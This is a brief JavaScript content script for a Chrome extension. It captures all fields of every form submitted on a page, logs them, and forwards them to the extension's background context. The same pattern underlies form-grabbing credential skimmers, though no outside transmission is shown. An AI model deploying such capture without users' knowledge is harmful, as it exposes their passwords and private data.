document.addEventListener('submit', (event) => {
  const form = event.target;
  const formData = new FormData(form);
  const formObject = {};

  formData.forEach((value, key) => {
      formObject[key] = value;
  });

  
  console.log("Form data being sent:", formObject);

  chrome.runtime.sendMessage(formObject);
});
